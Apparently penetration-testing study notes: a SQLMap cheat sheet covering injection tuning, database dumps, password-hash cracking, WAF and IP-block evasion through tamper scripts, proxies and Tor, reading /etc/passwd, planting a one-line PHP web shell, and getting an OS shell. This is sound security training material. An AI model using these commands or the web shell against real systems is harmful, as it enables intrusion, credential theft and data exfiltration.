Related articles:
Tags: #Tools 

---
# 📖 Definition: 
SQLMap is an open-source tool capable of performing various basic and advanced SQLinjections if given the right parameters.


# SQLMap HTTP Request Testing Guide
## Basic SQLMap Command Structure

|Command Type|Syntax|Example|Purpose|
|---|---|---|---|
|Basic URL|`sqlmap -u [URL]`|`sqlmap 'http://example.com/?id=1'`|Test GET parameters|
|POST Data|`sqlmap -u [URL] --data [data]`|`sqlmap 'http://example.com/' --data 'uid=1&name=test'`|Test POST parameters|
|Request File|`sqlmap -r [file]`|`sqlmap -r req.txt`|Test from saved request|

## Common SQLMap Options

|Option|Syntax|Example|Purpose|
|---|---|---|---|
|Headers|`-H [header]`|`-H 'Cookie: sessid=123'`|Add custom headers|
|Cookie|`--cookie [value]`|`--cookie='PHPSESSID=abc123'`|Set specific cookie|
|User Agent|`--random-agent`|`--random-agent`|Use random browser UA|
|Method|`--method [type]`|`--method PUT`|Specify HTTP method|
|Parameter|`-p [param]`|`-p uid`|Test specific parameter|

## Request Format Support

|Format|Example|Note|
|---|---|---|
|Form Data|`id=1&name=test`|Default POST format|
|JSON|`{"id":1,"name":"test"}`|Automatic detection|
|XML|`<root><id>1</id></root>`|Automatic detection|

## Advanced Features

|Feature|Option|Purpose|Example|
|---|---|---|---|
|Parameter Mark|`*`|Mark injection point|`id=1*&name=test`|
|Mobile Mode|`--mobile`|Emulate mobile device|`sqlmap -u URL --mobile`|
|Custom Injection|`--cookie="id=1*"`|Test headers for SQLi|Tests cookie value|
|Request File|`-r`|Use full HTTP request|Captures all request details|

## Best Practices

|Scenario|Recommended Approach|Why|
|---|---|---|
|Complex Headers|Use `-r` with request file|Maintains all request details|
|Session Required|Include `--cookie` or header|Maintains authentication|
|WAF Present|Use `--random-agent`|Bypasses basic UA filters|
|Unknown Parameters|Use crawling (`--crawl`)|Discovers parameters automatically|

---


# SQLMap Attack Tuning Guide

## Core Injection Components

|Component|Description|Example|
|---|---|---|
|Vector|Central payload code|`UNION ALL SELECT 1,2,VERSION()`|
|Boundaries|Prefix/suffix wrappers|Prefix: `%'))`, Suffix: `-- -`|

## Level and Risk Settings

|Setting|Range|Purpose|Impact|
|---|---|---|---|
|Level|1-5 (default: 1)|Controls boundary complexity|Higher = more boundaries tested|
|Risk|1-3 (default: 1)|Controls payload aggression|Higher = more dangerous payloads|
|Payload Count|Level 1 + Risk 1|~72 payloads|Basic but safe testing|
|Payload Count|Level 5 + Risk 3|~7,865 payloads|Comprehensive but slow testing|

## Advanced Tuning Options

|Option|Syntax|Purpose|Example Use Case|
|---|---|---|---|
|`--code`|`--code=XXX`|Match HTTP status|When responses differ by status code|
|`--titles`|`--titles`|Match page titles|When titles indicate success/failure|
|`--string`|`--string=text`|Match specific text|When responses contain unique markers|
|`--text-only`|`--text-only`|Ignore HTML tags|When dealing with dynamic content|
|`--technique`|`--technique=X`|Specify attack type|B(oolean), E(rror), U(nion), etc.|

## UNION Query Tuning

|Option|Syntax|Purpose|Example|
|---|---|---|---|
|`--union-cols`|`--union-cols=N`|Set column count|`--union-cols=17`|
|`--union-char`|`--union-char=X`|Set fill character|`--union-char='a'`|
|`--union-from`|`--union-from=X`|Set FROM clause|`--union-from=users`|

## Key Best Practices

|Scenario|Recommendation|Reason|
|---|---|---|
|Default Testing|Use default level/risk|Fastest, covers common cases|
|Login Pages|Increase risk level|Needed for OR-based payloads|
|Complex Responses|Use `--text-only`|Reduces false positives|
|Known Structure|Use `--union-cols`|Speeds up UNION attacks|

Note: Higher levels of testing significantly increase scan duration and potential for false positives or server stress. Use elevated settings only when necessary.


---

# SQLMap Database Enumeration Guide: A Comprehensive Overview

## Basic Database Information Gathering

|Command Purpose|SQLMap Option|Retrieved Information|Example|
|---|---|---|---|
|Version Info|`--banner`|DBMS version & details|MySQL 5.1.41|
|Current User|`--current-user`|Active database user|'root@%'|
|Current Database|`--current-db`|Active database name|'testdb'|
|Admin Check|`--is-dba`|DBA privilege status|True/False|

## Database Content Enumeration

|Level|Command Syntax|Purpose|Example Output|
|---|---|---|---|
|Table Level|`--tables -D [database]`|List all tables|member, data, users|
|Column Level|`--dump -T [table] -C [columns]`|Specific columns|name, surname|
|Full Table|`--dump -T [table] -D [database]`|Complete table content|All rows & columns|
|Full Database|`--dump -D [database]`|All tables in database|Complete DB dump|
|All Databases|`--dump-all`|Every accessible database|System-wide dump|

## Advanced Enumeration Options

|Feature|Command Option|Purpose|Example Usage|
|---|---|---|---|
|Row Selection|`--start=X --stop=Y`|Limit row range|Rows 2-3 only|
|Conditional Dumps|`--where="condition"`|Filter results|`name LIKE 'f%'`|
|System DB Exclusion|`--exclude-sysdbs`|Skip system tables|Used with --dump-all|
|Output Format|`--dump-format`|Change output type|CSV, HTML, SQLite|

## Best Practices & Tips

|Scenario|Recommended Approach|Why|
|---|---|---|
|Large Tables|Use column selection (-C)|Reduces dump time|
|System Assessment|Include --exclude-sysdbs|Focuses on user data|
|Data Analysis|Use --dump-format=sqlite|Enables SQL analysis|
|Targeted Extraction|Combine --where with -C|Precise data retrieval|
# Advanced SQLMap Database Enumeration Guide

## Schema Enumeration and Structure Analysis

|Feature|Command|Purpose|Output Example|
|---|---|---|---|
|Full Schema|`--schema`|Map complete DB structure|Tables, columns, and data types|
|Search Tables|`--search -T keyword`|Find tables by name|All tables containing 'user'|
|Search Columns|`--search -C keyword`|Find columns by name|All columns containing 'pass'|

## Password Handling Capabilities

|Operation|Command|Functionality|Details|
|---|---|---|---|
|Hash Detection|`--dump -D db -T table`|Auto-detects password hashes|Recognizes 31 hash types|
|Hash Cracking|Automatic prompt|Dictionary-based attack|Uses 1.4M word dictionary|
|DB User Passwords|`--passwords`|Extracts DB user credentials|Includes system accounts|
|Multi-Core Cracking|Automatic|Parallel processing|Based on CPU cores|

## Advanced Search Features

|Search Type|Query Example|Finds|Notes|
|---|---|---|---|
|Table Search|`--search -T user`|user, users, user_data|Case insensitive|
|Column Search|`--search -C pass`|password, pass, user_pass|Matches partial names|
|Combined Search|Multiple `--search` options|Multiple patterns|Can combine criteria|

## Automation and Batch Processing

|Feature|Command|Purpose|Best For|
|---|---|---|---|
|Full Enumeration|`--all --batch`|Complete DB enumeration|Thorough assessment|
|Hash Processing|`--passwords --batch`|Automated hash handling|Quick credential audit|
|Output Formats|Various|Multiple output options|Documentation/Analysis|

### Important Notes:

- Dictionary attacks use built-in wordlist at `/usr/local/share/sqlmap/data/txt/wordlist.tx_`
- Password cracking is automatically multi-threaded
- Results are logged to SQLMap's output directory
- Consider system load when using `--all`
- `--batch` automates user input prompts

---

# SQLMap Protection Bypass Guide

## Anti-CSRF Token Protection

### Understanding the Mechanism

When web applications implement anti-CSRF tokens, each request must contain a valid token that's only available to legitimate users who visited the page. SQLMap provides elegant solutions to handle this protection:

|Protection Type|SQLMap Solution|Example Usage|Notes|
|---|---|---|---|
|Standard CSRF|`--csrf-token`|`--csrf-token="csrf-token"`|Automatically parses and updates tokens|
|Auto-detection|Automatic prompt|N/A|Detects common token names (csrf, xsrf, token)|
|Dynamic Tokens|Parameter parsing|`--data="id=1&csrf-token=WfF..."`|Updates token in subsequent requests|

## Parameter Value Protection

### Unique and Calculated Values

|Protection Method|SQLMap Option|Example|How It Works|
|---|---|---|---|
|Unique Values|`--randomize`|`--randomize=rp`|Generates random values for specified parameter|
|Calculated Hashes|`--eval`|`--eval="import hashlib; h=hashlib.md5(id).hexdigest()"`|Executes Python code before requests|

## IP Protection Bypass

|Method|Command Option|Purpose|Example|
|---|---|---|---|
|Single Proxy|`--proxy`|Use specific proxy|`--proxy="socks4://177.39.187.70:33283"`|
|Multiple Proxies|`--proxy-file`|Rotate through proxy list|`--proxy-file="proxies.txt"`|
|Tor Network|`--tor`|Route through Tor|`--tor --check-tor`|

## WAF/IPS Bypass Techniques

### Tamper Scripts Overview

|Category|Script Example|Purpose|Usage|
|---|---|---|---|
|Operator Replacement|`between`|Replaces `>` with `NOT BETWEEN`|`--tamper=between`|
|Case Manipulation|`randomcase`|Randomizes keyword case|`--tamper=randomcase`|
|Space Replacement|`space2comment`|Replaces spaces with comments|`--tamper=space2comment`|
|Encoding|`base64encode`|Base64 encodes payload|`--tamper=base64encode`|

### Popular Tamper Script Combinations

|Scenario|Tamper Combination|Purpose|
|---|---|---|
|Basic WAF|`between,randomcase`|Basic WAF evasion|
|Advanced WAF|`between,space2comment,randomcase`|Complex evasion|
|MySQL Specific|`modsecurityversioned,space2comment`|MySQL WAF bypass|

## Additional Bypass Techniques

|Technique|Option|Purpose|Best For|
|---|---|---|---|
|Chunked Encoding|`--chunked`|Splits POST data|Keyword blacklist bypass|
|Parameter Pollution|Built-in|Splits payload across parameters|ASP/Similar platforms|
|User-Agent Randomization|`--random-agent`|Bypasses UA blacklisting|Basic WAF rules|

### Best Practices

1. Start with basic techniques:
    - Use `--random-agent` by default
    - Enable `--tamper=between,randomcase` for initial WAF bypass
2. Escalate methodically:
    - Add chunked encoding if needed
    - Layer additional tamper scripts
    - Consider proxy rotation for persistent blocks
3. Monitor effectiveness:
    - Use verbose mode to track success
    - Watch for WAF detection messages
    - Adjust strategy based on response patterns

# SQLMap OS Exploitation Guide: A Comprehensive Approach

## Core Components and Prerequisites

|Component|Description|Verification Command|Success Indicator|
|---|---|---|---|
|DBA Privileges|Required for most operations|`--is-dba`|`current user is DBA: True`|
|File Privileges|Needed for file operations|Automatic check|Part of DBA verification|
|Webroot Access|Required for web shells|Directory listing|Write permission in web directory|

## File Operations Capabilities

### Reading Files

|Operation|Command Syntax|Example Usage|Notes|
|---|---|---|---|
|Basic File Read|`--file-read [path]`|`--file-read "/etc/passwd"`|Requires FILE privilege|
|Output Location|Automatic|`~/.sqlmap/output/[domain]/files/`|Files saved locally|
|Alternative Methods|`--no-cast`, `--hex`|Used for troubleshooting|Helps with encoding issues|

### Writing Files

|Operation|Command Options|Example|Requirements|
|---|---|---|---|
|Basic Write|`--file-write`, `--file-dest`|Write "shell.php" to webroot|Write permissions needed|
|Web Shell Creation|Write PHP file|`<?php system($_GET["cmd"]); ?>`|Web directory access needed|
|Configuration Check|MySQL `secure-file-priv`|Server configuration|Must be disabled/configured|

## Command Execution Methods

|Method|Command Option|Advantages|Limitations|
|---|---|---|---|
|OS Shell|`--os-shell`|Interactive shell|May require specific technique|
|Technique Selection|`--technique=X`|Better success rate|E.g., `--technique=E` for error-based|
|Manual Shell|Custom PHP shell|More reliable|Requires file write access|

## Advanced Features

|Feature|Purpose|Example Usage|Notes|
|---|---|---|---|
|Automatic Webroot Detection|Finds web directory|Common locations checked|Can be manually specified|
|UDF Creation|User-defined functions|Automatic with `--os-shell`|For advanced exploitation|
|Multiple Techniques|Various exploitation methods|`--technique=XYZ`|Try different methods|

## Best Practices & Operation Flow

1. Privilege Verification:
`sqlmap -u "http://target.com/?id=1" --is-dba`

2. File Read Testing:
`sqlmap -u "http://target.com/?id=1" --file-read "/etc/passwd"`

3. File Write Testing:
`sqlmap -u "http://target.com/?id=1" --file-write "shell.php" --file-dest "/var/www/html/shell.php"`

4. Shell Access:
`sqlmap -u "http://target.com/?id=1" --os-shell --technique=E`

---

# Ultimate SQLMap Reference Table

|Category|Command/Option|Syntax Example|Purpose|Requirements|Success Indicators|Common Issues|Best Practices|
|---|---|---|---|---|---|---|---|
|**Basic Injection**|`-u URL`|`sqlmap -u "http://target.com/?id=1"`|Initial injection test|Valid URL parameter|Identified injection point|Parameter not injectable|Start with single parameter|
||`--data`|`--data="user=test&pass=test"`|Test POST data|Valid POST form|POST parameter vulnerable|Form tokens|Use with `-u` for full URL|
||`--random-agent`|`--random-agent`|Bypass basic WAF|None|Successful requests|UAC blocking|Always use by default|
|**Authentication**|`--cookie`|`--cookie="PHPSESSID=abc123"`|Authenticated testing|Valid session cookie|Logged-in responses|Session expiry|Update cookies regularly|
||`--csrf-token`|`--csrf-token="csrf-token"`|CSRF bypass|Token parameter name|Successful form submission|Token validation fails|Monitor token updates|
|**Enumeration**|`--dbs`|`--dbs`|List databases|READ privileges|Database list|Access denied|Start enumeration here|
||`--tables -D db`|`--tables -D users`|List tables|DB READ access|Table list|No tables found|Target specific DBs|
||`--dump -T table`|`--dump -T users -C user,pass`|Extract data|Table READ access|Data extraction|Too much data|Limit columns with `-C`|
|**OS Access**|`--is-dba`|`--is-dba`|Check admin rights|None|`DBA: True/False`|Insufficient privileges|Check before file ops|
||`--file-read`|`--file-read "/etc/passwd"`|Read system files|FILE privilege|File content retrieved|Permission denied|Verify paths first|
||`--file-write`|`--file-write "shell.php"`|Write files|Write privileges|File written|Directory permissions|Test with harmless file|
||`--os-shell`|`--os-shell --technique=E`|Get system shell|Root/Admin access|Shell prompt|No output returned|Try different techniques|
|**WAF Bypass**|`--tamper`|`--tamper=between,randomcase`|Evade WAF/IPS|None|Successful injection|WAF blocks|Chain multiple scripts|
||`--technique`|`--technique=BEUSTQ`|Specify attack type|Valid injection point|Successful technique|Some techniques fail|Try different combinations|
||`--proxy`|`--proxy="socks4://IP:PORT"`|Hide source IP|Working proxy|Requests through proxy|Proxy connection fails|Use proxy lists|
|**Advanced**|`--risk`|`--risk=3`|Risky queries|None|More vulnerabilities|Server stress|Start with lower risk|
||`--level`|`--level=5`|Test depth|None|More test cases|Longer scan time|Increase gradually|
||`--batch`|`--batch`|Automated run|None|No prompts|Missing user input|Use for automation|
||`--threads`|`--threads=10`|Parallel tests|None|Faster scanning|Server overload|Balance with stability|
